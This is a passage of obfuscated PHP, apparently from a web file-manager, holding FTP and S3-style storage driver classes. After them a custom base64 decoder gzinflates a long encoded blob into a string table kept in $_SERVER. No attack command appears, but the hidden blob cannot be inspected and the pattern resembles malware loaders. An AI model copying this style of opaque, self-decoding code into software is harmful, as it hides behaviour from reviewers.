listAll($©›şÓÈ) { $çıª¿×¶ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->_isconn()) { return !1; } $¸‰­Ã€ø = $¯ıÅ½ıõ = array(); $this->fileList($©›şÓÈ, $¸‰­Ã€ø, $¯ıÅ½ıõ, !0); $°½Êóˆ± = array_to_keyvalue($¯ıÅ½ıõ, $çıª¿×¶[32]); foreach ($¸‰­Ã€ø as $³íåÂ—Ö) { if (is_string($³íåÂ—Ö)) { $°½Êóˆ±[$³íåÂ—Ö] = array($çıª¿×¶[79] => 0); } } return $this->listAllFiles($©›şÓÈ, $°½Êóˆ±); } public function getContent($ó¤˜×òÂ) { if (!$this->_isconn()) { return !1; } $ó¤˜×òÂ = $this->iconvSystem($ó¤˜×òÂ); return $this->fileSubstr($ó¤˜×òÂ); } public function setContent($œáÉ®‹Œ, $Ä³Àë¬ = '') { if (!$this->_isconn()) { return !1; } $ıæìëƒù = $this->pathThis($this->iconvSystem($œáÉ®‹Œ)); $®½„Ê¿ = $this->tempFile($ıæìëƒù); file_put_contents($®½„Ê¿, $Ä³Àë¬); $ÅœÕöÂ = $this->upload($œáÉ®‹Œ, $this->iconvApp($®½„Ê¿)); $this->tempFileRemve($®½„Ê¿); return $ÅœÕöÂ; } public function fileSubstr($ä¢œ¦ÛÜ, $Ø€áÔ±Ñ = 0, $¿éïÔÎ’ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ä¢œ¦ÛÜ, $Ø€áÔ±Ñ, $¿éïÔÎ’); } private function ftpRequest($‚ñæÚè , $¤É•ß„ = 0, $Í‡»îš† = false) { $Şªë­¨­ =& $_SERVER[‘ÆÜ‘œ]; $‚ñæÚè  = $Şªë­¨­[8] . ltrim(str_ltrim($‚ñæÚè , $this->ftpPath), $Şªë­¨­[8]); $‚ñæÚè  = $this->iconvSystem($‚ñæÚè ); $†ËéË¦û = $this->scheme . $this->host . $Şªë­¨­[4] . $this->port; $İâ¬ÚÌ¿ = curl_init(); curl_setopt($İâ¬ÚÌ¿, CURLOPT_URL, $†ËéË¦û . $this->pathEncode($‚ñæÚè )); curl_setopt($İâ¬ÚÌ¿, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Í‡»îš†) { $¦ÌĞÍÇÖ = $¤É•ß„ + $Í‡»îš† - 1; curl_setopt($İâ¬ÚÌ¿, CURLOPT_RANGE, "{$¤É•ß„}\x2d{$¦ÌĞÍÇÖ}"); } curl_setopt($İâ¬ÚÌ¿, CURLOPT_RETURNTRANSFER, 1); $Ğ¥ñğ = curl_exec($İâ¬ÚÌ¿); curl_close($İâ¬ÚÌ¿); return $Ğ¥ñğ; } public function upload($€µ±‡­£, $Äûß­Ã, $ Ã©÷¿¶ = false, $œÁ¶îî½ = REPEAT_REPLACE) { if (!$Äûß­Ã || !@file_exists($Äûß­Ã)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($€µ±‡­£))) { return !1; } $€µ±‡­£ = $this->iconvSystem($€µ±‡­£); $Äûß­Ã = $this->iconvSystem($Äûß­Ã); $ä•ö°‹Ù = ftp_nb_put($this->connect, $€µ±‡­£, $Äûß­Ã, FTP_BINARY); while ($ä•ö°‹Ù == FTP_MOREDATA) { $ä•ö°‹Ù = ftp_nb_continue($this->connect); } if ($ä•ö°‹Ù != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } return $this->getPathOuter($€µ±‡­£); } public function download($ßõÌî‡ô, $ñ„±°Ó¥ = '') { if (!$this->_isconn()) { return !1; } $ó‡’™¶¸ = $this->pathFather($ñ„±°Ó¥); if (!IO::mkdir($ó‡’™¶¸)) { return !1; } $ßõÌî‡ô = $this->iconvSystem($ßõÌî‡ô); $ñ„±°Ó¥ = $this->iconvSystem($ñ„±°Ó¥); $ÎÔ™ÅÊŞ = ftp_nb_get($this->connect, $ñ„±°Ó¥, $ßõÌî‡ô, FTP_BINARY); while ($ÎÔ™ÅÊŞ == FTP_MOREDATA) { $ÎÔ™ÅÊŞ = ftp_nb_continue($this->connect); } if ($ÎÔ™ÅÊŞ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } return $this->iconvApp($ñ„±°Ó¥); } public function exist($ä™öı´§) { return $this->isFile($ä™öı´§) || $this->isFolder($ä™öı´§); } public function isFile($œÂîö‚‹) { return !$this->isFolder($œÂîö‚‹) && $this->objectMeta($œÂîö‚‹); } public function isFolder($®Åáô³Ù) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][178], $®Åáô³Ù); } protected function objectMeta($úÉĞ¸ãÀ) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][180], $úÉĞ¸ãÀ); } protected function _objectMeta($±¦œ¹®¤) { $è€‡Ğıù =& $_SERVER[‘ÆÜ‘œ]; if ($±¦œ¹®¤ == $è€‡Ğıù[12] || $±¦œ¹®¤ == $è€‡Ğıù[8]) { return array(); } if (!$this->_isconn()) { return !1; } $±¦œ¹®¤ = $this->iconvSystem($±¦œ¹®¤); $ˆ´§æ¬à = array($è€‡Ğıù[32] => $this->iconvApp($±¦œ¹®¤), $è€‡Ğıù[33] => $è€‡Ğıù[231], $è€‡Ğıù[79] => 0); $«ª«Ÿ€í = @ftp_size($this->connect, $±¦œ¹®¤); if ($«ª«Ÿ€í != -1) { $ˆ´§æ¬à[$è€‡Ğıù[79]] = $«ª«Ÿ€í; } else { $Ñ•°í»Ü = @ftp_chdir($this->connect, $±¦œ¹®¤); if (!$Ñ•°í»Ü) { return !1; } @ftp_chdir($this->connect, $è€‡Ğıù[8]); $ˆ´§æ¬à[$è€‡Ğıù[33]] = $è€‡Ğıù[78]; } return $ˆ´§æ¬à; } protected function _isFolder($Ìï¦å½) { $µğ‰¬İå =& $_SERVER[‘ÆÜ‘œ]; if ($Ìï¦å½ == $µğ‰¬İå[12] || $Ìï¦å½ == $µğ‰¬İå[8]) { return !0; } $²ÍáÈÕÜ = $this->_objectMeta($Ìï¦å½); return isset($²ÍáÈÕÜ[$µğ‰¬İå[33]]) && $²ÍáÈÕÜ[$µğ‰¬İå[33]] == $µğ‰¬İå[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Ÿ€ì«ÏÜ) { parent::__construct($Ÿ€ì«ÏÜ); $this->setSignVersion($_SERVER[‘ÆÜ‘œ][248]); } public function uploadLink($·ùº²¸ê, $¼É±°Ó = 0) { $ò§ÉäÕú =& $_SERVER[‘ÆÜ‘œ]; if ($this->isUploadServer()) { return; } $ÄÜªúğ© = $this->getType(); if (!in_array($ÄÜªúğ©, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¬£–×“Ÿ = (!$¼É±°Ó ? 1 : ceil($¼É±°Ó / pow(1024, 3))) * 3600 * 4; $æâ£¬âÓ = $this->uploadMultiData($·ùº²¸ê, $¬£–×“Ÿ); if ($æâ£¬âÓ) { $æâ£¬âÓ[$ò§ÉäÕú[95]] = $·ùº²¸ê; $æâ£¬âÓ[$ò§ÉäÕú[96]] = $ÄÜªúğ©; } return $æâ£¬âÓ; } public function fileOutImage($”ÇûĞĞ, $“‡Ë„ªå = 250) { if ($this->size($”ÇûĞĞ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($”ÇûĞĞ, $“‡Ë„ªå); } $ûÒ¿©•ª = $this->link($”ÇûĞĞ); $ûÒ¿©•ª .= $_SERVER[‘ÆÜ‘œ][1612] . $“‡Ë„ªå; $this->fileOutLink($ûÒ¿©•ª); } } goto Aá‘ˆõÈÌ; B¿¤ËÙİÈ¸: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('œ‘ÜÆ‘'), _kodDe('LJq+ruB9tg==')); $_SERVER[‘ÆÜ‘œ] = explode(base64_decode('fAF8A3wB'), gzinflate(substr(strrev('uµÒW7»fÎImˆ±Ël‰8œVvÅ¢vÁ!.§m-Â„´ \\0ÕÅ[|y½Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\143\111\127\321\275\362\222\204\226\55\354\141\137\133\326\2\145\173\22\2\24\10\204\255\55\320\5\50\135\240\320\26\332\2\261\23\332\122\12\74\120\112\151\371\146\71\147\146\256\44\303\363\375\336\77"."\xde\xfc\x92\xe8\xce\x3e\x73\xe6\xcc\x99\x33\x67\xce\x39\xf3\xc0\x5b\x3f\xf9\xcb\xf9\xef\x6c\xde\x67\xf3\x7e\x9b\xf7\xb9\x7d\xe2\x8c\xa7\xde\x7f\x9a\x7f\x6f\xde\x77\xf3\xfe\xe4\x1f\xfb\x3e\xe6\xbc\x3\x3e\xc3\xfe\x1c\x76"."\xde\xb9\xb5\xb5\x1d\xf3\xf\x9c\xdd\x7d\xd0\x85\xdf\xdf\x66\xdc\x61\x6c\x33\xce\x8d\x76\x3e\xfd\x4c\xe4\xe0\x9f\xff\xf7\x89\xe1\xc9\x9b\x9e\x1e\x9f\xdc\xe7\x33\x3f\xb8\xe3\xa2\x5d\x4d\x24\x33\x2f\xdb\xc4\x7f\xb4\xbc\xed"."\152\346\230\345\270\16\217\110\331\371\101\153\210\177\133\171\376\33\344\77\275\261\316\242\231\263\135\223\7\3\374\107\207\176\261\377\235\15\131\13\323\365\356\150\102\217\367\366\364\204\143\11\310\324\244"."\xa6\xe7\xec\x34\x7c\x15\x8c\xa2\x91\x83\xf6\xb\x66\xd1\x21\xbd\x51\xab\xd3\xb\x76\xc1\xcc\x7b\x62\x64\x44\xda\x70\x8d\xa4\xe1\x40\x4d\x6d\x2d\x7a\x5b\xb8\xa7\x33\xba\x46\x4f\xac\xe9\x9\x43\x8e\xa4\xbe\xa1\x64\x16\xc7".strrev('¼´,OJeEu¨Kggh±ñ•Euvn7h‘Z‡ê"Zİ#ËÂZ¿EŒr)œ¬&è£]Æ}ˆy')."\x2b\xa4\x91\xfe\x65\x4d\xdd\xca\xf\xda\xb5\xda\x3a\x9e\xb2\x4e\xab\xe3\x1f\xed\x96\x99\x4d\xf3\xcf\xbc\x81\xdd\x71\xc7\xb\xf0\x95\x10\x5f\x64\x9a\xf2\xa5\x6c\x96\x7\xba\xc5\x57\xda\x1c\x34\x4a\x59\x80\x56\x9b\x1a\x28"."\24\255\234\201\203\136\141\216\213\130\376\141\224\134\333\312\247\170\40\74\346\26\15\31\117\372\232\42\23\155\346\241\252\170\270\63\334\232\320\150\7\265\366\130\264\113\203\111\310\31\216\153\26\265\125"."\x1d\xe1\x58\x58\xa3\x9d\x6e\xae\x61\x63\xad\xd1\x0\x5f\xba\x9\x28\xb4\x50\x67\xa7\x36\x55\xd\xae\x99\x2b\x60\x35\xbc\x4c\x95\xca\xa2\xb1\xb6\x70\x4c\x6b\x59\xa3\x49\x8\xa5\xec\x5c\xce\xce\x7\x48\x2d\x64\x26\x5d\xa5".base64_decode('q+FYjH/4AL07I3TSIBBtb4+HRQgGd1In6ckcwE9PKD2YdfURI1tCNB3mvzXwA7+2A6i7wcpbJQ==')."\100\123\250\302\266\305\262\202\217\22\346\66\61\306\114\303\107\216\224\267\241\134\22\342\222\230\153\75\176\130\144\205\216\360\317\346\45\374\167\21\224\117\352\64\315\54\272\272\231\117\331\151\53\17\353".base64_decode('eCngo+Fm2ooWycDDg3Y2jd+OtRFGOWhlze5STs0igqmMlU0Xcel9Uk4e7BQrmeaVoQLpiSAC1g==')."\340\270\134\212\64\137\217\110\165\354\122\61\145\106\310\322\341\341\6\210\66\135\227\14\16\1\142\367\26\262\266\221\216\233\105\61\64\313\156\47\25\105\113\256\32\71\214\253\40\255\0\41\130\333\167"."\xaa\xff\x3f\x3\x7d\xcb\xc8\x7f\x75\x40\xe8\xfa\xa1\x99\x8c\x99\xcd\xea\xe6\x98\x9\xcb\x24\x97\x9e\xe7\xe0\xf8\x82\x4e\xd2\xca\x7\x49\xc\xf\x46\xa2\x7a\xc6\x70\x32\x5d\xe9\x79\x3a\x2b\x85\xf4\x33\x6d\x8e\x5\xa\x99"."\x2\xac\x61\xb1\x6c\xfb\x3d\x68\x4c\xa1\xd1\x6d\xbb\x61\x85\xa\x67\xed\x94\x1\x79\x4b\x6c\x70\xfc\x3b\xe3\xba\x85\xb8\x99\x4f\xd3\xc1\xc1\x50\xec\xd1\x3c\x1b\x7c\xc1\x34\x21\x53\x9b\x4f\x4b\x6b\x5d\xda\x1a\xad\xa3\xc9"."\152\162\260\140\56\53\276\160\164\42\316\21\221\356\30\316\120\172\20\20\20\67\201\351\320\240\345\60\172\46\27\243\121\50\144\255\224\341\132\166\76\150\247\134\323\365\73\156\321\64\240\306\120\52\145"."\72\216\277\325\316\273\105\73\353\17\145\263\366\250\77\132\264\206\254\174\223\66\13\110\53\111\44\113\330\117\311\135\23\254\313\351\213\64\212\13\264\231\131\315\45\167\320\277\20\327\233\310\135\64\362"."\316\240\131\364\207\1\331\233\64\322\131\101\363\60\133\233\345\24\154\307\242\335\153\322\14\327\65\122\31\112\57\144\365\315\237\220\337\312\147\255\274\131\231\227\124\142\372\173\212\306\120\316\150\322\12"."\xa5\x24\x1\x0\xac\x31\x88\x4b\xd1\x1c\x6a\x66\x0\x40\x93\x96\x33\xc6\xfc\xc6\x10\xd6\x14\x1e\x2b\x58\x45\xd3\xc1\x51\x6b\xcb\xbb\x12\x80\x51\x83\xfe\x2e\xba\x36\x2c\x33\xed\x8f\x13\x82\xc\x95\xcd\xa9\x9f\xab\x11\x5c".base64_decode('0TCNx3YkEj16pJ3suN1hvSuUaO2A2l1jCKvuJGRWVImRq/1kjVBs6iaDk5E99qhZJA23jDdpww==')."\166\72\151\217\5\60\211\146\216\23\142\201\231\351\374\26\134\177\314\310\17\321\141\44\307\135\323\51\47\67\55\144\177\16\14\362\5\31\110\232\203\166\21\106\343\214\14\171\201\337\151\346\207\334\14".strrev('›]…9dgZat©6†§í_ĞQœ±r˜€M31ıg­¡½†3˜\'vÁŠXÚ<zc†VÇÖ')."\xdf\x21\x99\xfc\x6a\x2e\xac\xbb\xd3\xca\x59\x74\x78\xae\x48\x61\xc0\x26\x7b\xfd\x72\xe8\x50\x90\x8d\xb9\xb9\xdf\x99\x55\xdb\x9f\x9e\x5d\xe7\x27\xff\xcf\xaa\xeb\xeb\x6f\xb\xcc\x1a\x58\x1a\xb4\x64\x99\x60\x43\xa0\x41\x6b"."\xac\x9f\xaf\xf5\x10\xe6\xc3\x32\xb2\x1a\xc\xba\x22\x47\xbd\x16\x5d\xe1\x5\x8b\xc4\xf0\xbc\x9d\x37\xab\x2e\x2c\x82\x48\xb6\x63\xfa\x3b\x4c\x83\xd0\x5d\x32\x11\x9e\x79\xf1\x61\x5b\x3c\xfc\x9\xd0\xa5\xdb\x9f\x42\x4b\xca"."\346\205\107\306\302\47\365\206\343\11\275\53\234\350\210\266\101\367\303\41\370\312\223\302\254\277\70\307\224\327\202\235\56\17\325\232\143\312\266\40\311\173\112\5\10\53\327\155\217\42\101\57\103\240\326"."\x8c\x99\x1a\x9e\x22\x8d\x7c\xc1\x68\x6c\x4e\x97\x70\xea\xfa\xf8\xcf\x0\x60\xf3\x0\xff\xd1\xf5\xd6\xce\x70\x28\xa6\x3\x93\xaa\x5b\x4e\xbb\xb2\x33\xd2\xa0\x20\xb7\xba\x9d\x5c\x4f\x10\xad\xcb\x74\xd\x39\x0\xd2\x5c\x24"."\x47\x96\xb4\x1c\x88\xee\xdd\xc6\x70\x94\x5d\x12\xf1\xc9\xa\x5a\x65\xa5\xc5\x3e\x47\x82\x1d\xa6\x35\x94\x81\x7e\x5b\xb4\xba\x94\x9d\xb5\x8b\x46\x96\x6e\x5\xc8\x9a\xe\x59\x40\x95\xb\xd9\x12\x59\x6\x41\x5a\x71\x22\x53"."\xca\x25\x61\xe3\x22\x20\x1b\x32\x5d\xc9\x35\x3a\xe3\x84\xb5\xca\xe1\x9e\x4b\x36\x6e\x37\xd2\xe6\xd9\x59\x21\x14\xd4\x29\xea\xf6\x7\xa\xf9\xa1\xba\x19\x50\x97\xde\x38\xaf\x9e\x46\xc0\xac\xc2\xc8\x8\xfb\x5c\x32\x2b\x87"."\x1e\x48\xd9\x64\x9d\x77\x19\xc3\x66\x13\x1d\xb\x10\xb7\x45\x2c\x16\x3\xa\xfd\x5c\x44\xb7\xbc\xe6\x72\x32\x41\x67\x2b\x1b\xc8\x91\x4a\x58\x9d\xad\xb6\xd8\xa4\xf9\x1\x65\x91\x77\xcb\xd3\xcc\x62\xd1\x2e\x1e\xb\x39\xd8".base64_decode('t8b2TTpdULkrGAuHUAT8ztiCEbERN5uCMO6Zje1ARdKEIQs4LpkEMkAjna4WTSgPVLAZ0ZYlIA==').base64_decode('WxCMzyF/JQ+QtnMG7qiUEIlmacARIbZNmmm+T3qi+ALnUbOwyaJr08SiJydB0owNnSZYAQMuiQ==').strrev('d ¶Q«2YŸ’¼;”’ z*ğÀ1”’‘‰Ë6Ù+ç :Åı326CÔjÈ˜ËDÖfÒ#‘')."\270\247\150\16\132\143\110\112\306\334\56\243\70\214\3\43\45\345\122\244\1\145\231\266\367\166\166\352\255\321\356\4\71\217\361\230\125\261\110\42\214\24\53\324\246\207\132\173\40\44\151\240\140\340\124"."\x16\x84\xc7\x8c\x34\x2\xa\x91\x4e\x4\x25\xaf\x44\x36\xeb\x82\x9d\x27\x94\x16\x88\x95\x5f\x9e\xd6\x2a\x92\xd2\x92\x95\x0\xdc\x91\xec\x47\x19\x47\x41\x78\x82\xdc\x46\x7f\x8e\xd0\x15\xbf\xe8\x53\x4f\x2f\xf0\x2\x88\x15"."\xc8\xe9\xb6\x8c\xb7\xdb\x45\x64\xe3\xac\xa1\xfc\x4a\x31\xf3\xab\xe2\x73\xfd\x1d\x5d\xa1\x56\x7f\xbc\x23\xd4\x38\x6f\x3e\x8f\x5d\x93\x4b\xf7\x27\x3a\x2c\xa7\x7f\xad\x8\x43\x77\x46\x9d\xb9\x7a\xd1\x24\x6b\x1a\x71\xa1\xb1".strrev('àJŒøìÍæµã¹ÉTØjRÉ'."\0".'p-4ïĞD¤!–¾{5Ö=}}@ÊYBÖŸœş5óÙKáW¾')."\x3b\x25\xb6\xbb\xe9\x46\x8a\x56\xa7\x93\xc2\x6e\xc9\x51\x21\x45\x10\x30\x4d\x8a\x58\xc8\x25\xf3\x58\x23\x3b\x64\x13\xbc\xcb\xe4\xd4\xc8\xb4\xc0\x5f\x1e\x36\x39\xcb\x5\xd\x65\xc\x1\x27\xa\x3d\x5c\x1c\x84\xa1\x1b\x57"."\13\121\60\223\76\40\375\366\362\330\132\242\72\240\71\353\36\1\150\313\176\24\350\316\106\250\66\116\333\361\374\347\100\350\106\211\254\333\242\265\121\201\376\122\254\11\151\146\64\16\115\216\345\262\362"."\130\5\240\1\150\252\103\33\323\111\212\16\51\272\232\322\41\350\0\316\102\127\133\331\232\340\233\77\217\133\274\224\264\250\215\120\41\215\235\157\256\151\10\324\327\150\170\330\154\256\351\115\264\23\76"."\175\351\222\3\27\267\332\271\2\45\53\135\245\254\153\321\361\162\314\135\2\143\134\114\171\40\14\364\224\201\43\234\60\140\327\131\34\124\363\55\16\116\125\53\14\205\62\146\253\365\236\316\120\242\75"."\x1a\xeb\x2\x1c\x2f\x14\x24\x5a\x15\x52\xd5\x56\x9b\x5f\x52\xa4\x92\xe3\x37\x29\x9f\xc\xab\xc0\x48\x65\xcb\x50\x54\x85\xc5\xea\xaa\x98\xb8\xba\x1a\x26\xae\x2e\xc3\xc4\xd5\x95\x98\xb8\xba\x1a\x9e\x8d\x0\x42\x1a\x39\x63".strrev(':¼=R3¨enöÄğèš%¾5A’¶ŞøÊ‰sğ›¤zÂÛEw¡^éÑ"Ğ'."\n".'@¹´l•ë\'£')."\x12\x4f\xc4\xab\x26\x91\xb8\xde\x70\x59\x8a\x6e\xc8\x5d\x82\x7e\x49\xc1\x2\x4f\xa1\x67\x87\x88\x22\x40\xd0\xc9\xd6\x84\x88\x9\x90\x68\x9\xc5\x23\xad\x7a\x4f\x8\x3b\x48\xa6\x30\xe8\xa4\x87\x9d\xa0\x51\x4c\x65\x8\xa3"."\320\151\45\203\364\364\115\105\177\1\161\76\5\110\245\50\137\250\33\111\262\261\43\23\133\242\207\70\340\25\333\132\364\236\130\270\75\262\132\4\333\43\341\316\266\270\336\32\152\355\10\213\310\356\120"."\x17\x8e\x67\x90\x8a\xe8\x9c\xa0\x37\xbf\x4e\x38\xe7\xb8\x10\xf4\xe9\xb0\x1e\x70\x9c\xaa\x6c\x4d\x47\xa9\x91\x2e\x37\xa\x72\xa\x33\x1\x5b\x60\x36\xa8\xa8\x94\x1\x5a\x47\x4a\x5a\x12\x7c\x30\x8a\x1c\x72\x38\x52\x72\x82"."\4\300\340\361\251\226\377\324\151\241\270\346\26\164\261\347\47\307\305\47\33\6\206\165\344\165\11\267\4\35\321\200\235\257\350\212\116\363\264\50\207\266\352\21\241\101\127\160\314\145\141\62\315\62\215"."\140\112\210\11\147\11\306\62\314\201\146\54\262\161\26\335\20\166\147\120\12\106\365\150\117\70\26\242\142\125\175\125\54\332\275\34\12\214\146\114\354\100\4\346\241\26\117\321\40\135\165\45\377\141\144"."\55\3\320\53\47\241\277\336\106\230\22\64\302\263\111\36\1\236\244\314\27\162\344\370\61\110\10\16\62\116\166\111\324\237\264\155\250\63\113\17\214\120\275\203\70\61\206\354\303\154\261\275\302\102\212".base64_decode('rgh364hIPKQgH48Ix2LRGAzbtYdR/sYTY+F4GNY93cotBEowMBuQ1iQsJzQf/Eb/6OzaPv/swA==').base64_decode('APmom7WMByHUH/AE8SRQKorSlEutdZbWNfUH+4O1S5v6Qv6Nhn9jvf8E/wA5P9TNhoiBTY2+uQ==')."\47\323\14\44\343\322\343\6\310\117\163\377\322\231\375\376\343\277\271\156\131\137\377\100\115\323\354\143\373\3\307\365\217\16\314\252\133\212\355\244\112\105\162\104\301\175\227\164\65\75\273\226\164\211\234".strrev('¢pË¥L–¿È_"3Ha=(E·•D§)T°=ŸïçÑ,æo2xÆOóMØÈ*Ñ°˜°M²¼–E©')."\x94\x4f\xc9\xcd\x9a\x62\x7f\xd2\x10\x87\xd3\xa1\xbc\x3c\xf5\xb9\x45\x21\x93\x1d\x21\x18\x29\xf7\x83\x4d\x33\xf9\xef\xc9\x38\x91\x43\xe6\x18\x52\x82\xfc\xa0\x85\xcc\x5e\x29\x6f\x6d\xc0\xe3\x57\xde\xdc\x0\x1f\xb6\x2b\xb0".strrev('XgKP‰ë¨FW‚Œ¤íÈ4ÓÌ["QÑ\'§AVLQÀ›I1§²¬¡)$Š=Àä	ïDMGtØ').base64_decode('HKuB8GKYEcEWcXNDhiYJKFIBRYrGpFqwvp0NWY0tf34EbGKXWE6pQE9zGplxAluNcJda8xKNgw==')."\x1c\xca\xe9\xea\x4\x14\xc4\x29\x8d\x8a\x61\x4d\xb9\xd0\x29\x1d\x82\x3e\x15\xe4\xc\x39\xe4\x94\x84\xe7\x94\x60\x6d\x7f\x7f\xa9\xcf\x4c\xf\xf4\x11\xc4\x37\xfc\x83\x3\x9b\xe6\x9c\x5c\x87\xa2\x9e\x60\x3f\xf9\x83\x81\x50"."\225\353\24\335\160\21\44\202\372\351\313\303\211\0\355\221\20\240\173\2\42\231\7\355\242\70\366\24\74\162\7\327\166\215\254\247\212\4\215\101\302\204\234\36\310\235\371\274\167\112\172\105\31\42\345".strrev('ÃÅ'."\r".'kY»å	å$náUŸÈÖu'."\0".'ÊÈÌ¥hX¡n-bU„D”ør 7MÄKB%rºüç!nÏ‘ŠF')."\2\256\360\300\160\167\33\334\366\360\377\201\107\206\154\213\16\304\15\45\117\26\163\253\262\257\362\113\204\70\23\221\170\256\316\34\223\62\32\355\245\154\326\25\202\52\313\326\271\310\244\54\250\347\204"."\50\210\304\61\206\306\313\314\144\255\141\50\3\113\34\256\0\375\320\313\331\325\332\44\307\73\154\151\26\310\335\247\317\252\226\61\222\317\333\351\244\272\102\44\53\260\74\104\170\302\204\126\213\327\125".strrev('iYq0øañ#Ú¿Ö?6‘€Y Ü0‰ãŠ–‘	î&–I°rn¡Ã;F‰k[¤Z')."\x57\xd4\x44\x4f\xb9\x3e\x2a\xf0\xf1\x51\xe\xc8\x47\x7a\xed\xa3\x4c\xa1\x4f\xca\x10\x7c\xf2\x16\xc8\x37\x62\x99\xa3\xec\x43\x9c\xef\x7d\x70\xec\xf7\x49\xe9\x16\x7c\x46\xda\x7c\x96\xd3\xc6\xc4\x17\xac\x1\x96\x84\x5d\x70".strrev('e‘fóG³å/y>l]5ÎŒû“ì[ B^­Ğmt¤ÇÏ´¡ô}‡ËÜ¡õ™ˆæ;¼}Æ5Ÿ’T3')."\xb0\x49\xc9\x87\x4f\x4a\x45\x7c\x43\x45\xbb\x54\xe8\xc1\x36\x95\x10\xef\x16\x44\xc8\x3e\x8b\x88\x98\x6d\xbb\x3e\x14\x20\xfa\x54\x49\x22\xf4\x22\x84\x8b\xba\x2a\x38\xab\x8f\x86\xc1\xbf\xbc\x13\x80\x5f\x34\xa9\x12\x4a\x9f".base64_decode('MlmV8+EVom7iNYIA+WTcnD15mDBT8MgU4PJLIRZ0AO0G3ICqa9Ir0sQtEdFY3lfJy0fJkZfLsw==')."\312\257\45\151\243\344\124\32\127\232\163\215\41\154\213\122\126\161\146\255\222\225\177\307\314\324\170\112\12\310\332\24\261\233\67\44\240\317\126\116\65\254\257\76\253\2\223\305\44\34\70\155\32\102\25"."\xd1\x5b\xcc\xa8\x67\x55\x7c\xfa\x7a\x84\x91\x30\x6a\x19\x2d\x48\x6e\x87\x77\x96\xee\x12\x71\xb2\xfb\xb6\x67\x11\xc\x8d\x6a\x32\xec\xf\x3e\x6f\x88\x2e\xa7\x0\xa3\xfd\xec\x6a\x3f\x2e\x64\xb1\x9d\xe1\xf6\x84\x76\x62\x94".base64_decode('0CsvndXYf3Ze89SN4CLbA6tRhI18msesIxvRuubp2Mh0T3GJGN5O+DCoVaIaBbcKBIoAbPhy8w==').base64_decode('xKio3KtLwKIaTop/UEk2fJkYJ6dWxUSFwMgI7JenXRqUqwhRQqMN+BSmihIRv1wPSrDa1iYwsg==')."\154\207\247\40\352\261\362\343\126\76\156\121\311\114\171\54\54\154\326\205\36\303\161\106\11\347\2\373\336\254\131\263\64\311\103\110\26\206\256\166\31\342\110\73\325\67\337\125\250\364\206\67\357\203\73"."\x78\x1f\x3d\xef\x2b\x5b\xbd\x14\x1a\xe3\x1e\x9d\xf3\x5c\xe0\x54\xe\xc\x2a\x52\xb2\x48\x0\xc1\x2\x87\x5\x91\x31\x8a\x12\xd6\x48\x96\x28\x6d\x10\x63\x70\x68\x16\x19\x54\xb2\xd\x1a\x23\x92\xbd\xf2\x94\x51\x88\x8b\xe3"."\216\143\357\325\117\157\245\74\330\346\143\277\35\244\363\276\22\351\45\243\307\235\4\26\344\207\165\64\141\113\322\316\77\172\330\276\114\326\67\111\342\173\271\63\5\41\240\23\103\105\215\352\346\307\233".strrev(',½AÂ+£„‘jE‰"òwŠºÎM+å$´xéGYQ	+ß¡©¸6µG#âĞBÒ³')."\x8\x27\xc0\x21\xb1\xa5\x90\xa3\x4d\x96\xec\xa0\xc5\x0\x5d\xa5\xcb\xe9\x3e\x88\x60\xe7\x4\x56\x6d\x3d\x6e\x12\x78\x40\xf5\xb2\x86\x78\x45\x9a\x9a\x5b\x8a\x64\xe9\x16\x23\xb7\x24\x71\xd1\x29\x16\xb9\x9c\x42\xb9\xa2\x87"."\x64\x87\xe8\x2c\xea\x95\xfd\xa0\x73\x51\x3d\xdc\x5e\xb4\x5\xf7\x2f\xb8\x89\xf2\x4c\xad\xec\xa0\x2d\x74\x71\xca\x38\x0\x5\x1e\x1e\xae\xa5\x22\x4a\x29\x53\xce\xbf\x94\xc5\x96\x5\x29\x4f\x53\x65\xab\x83\x6e\xb2\xfb\xb5"."\42\337\54\3\344\330\4\52\125\276\172\205\265\223\24\156\23\277\343\204\315\365\344\262\371\165\155\233\234\305\213\201\42\151\121\166\104\241\256\100\173\230\16\116\334\30\64\125\206\304\223\30\52\24\144"."\267\105\375\16\51\242\354\40\136\216\14\353\214\27\14\334\70\64\277\126\126\203\121\50\250\155\12\166\22\21\236\235\324\112\42\102\203\53\154\76\152\71\44\321\127\236\320\51\170\161\112\274\302\151\313"."\245\61\164\35\333\170\1\50\63\312\355\275\274\260\14\253\373\15\333\66\53\320\106\36\164\174\63\75\71\253\61\67\201\131\214\37\11\110\136\254\272\62\132\312\56\340\231\261\250\50\216\216\230\112\44"."\xbd\x8b\x2d\xc8\x14\x25\xc8\x93\x95\x24\x59\xa9\x92\x4b\x4c\x5\xeb\x11\x59\x99\x69\xc6\xc1\x4b\x28\xb0\xbc\x50\x96\x49\x2d\xf8\xe2\xf\xd0\x3\x4f\x40\xdd\x45\x42\xc5\x22\xa2\x3e\x1f\x26\xd5\x13\x20\x91\x6a\x14\x25\xce".strrev('jBÔ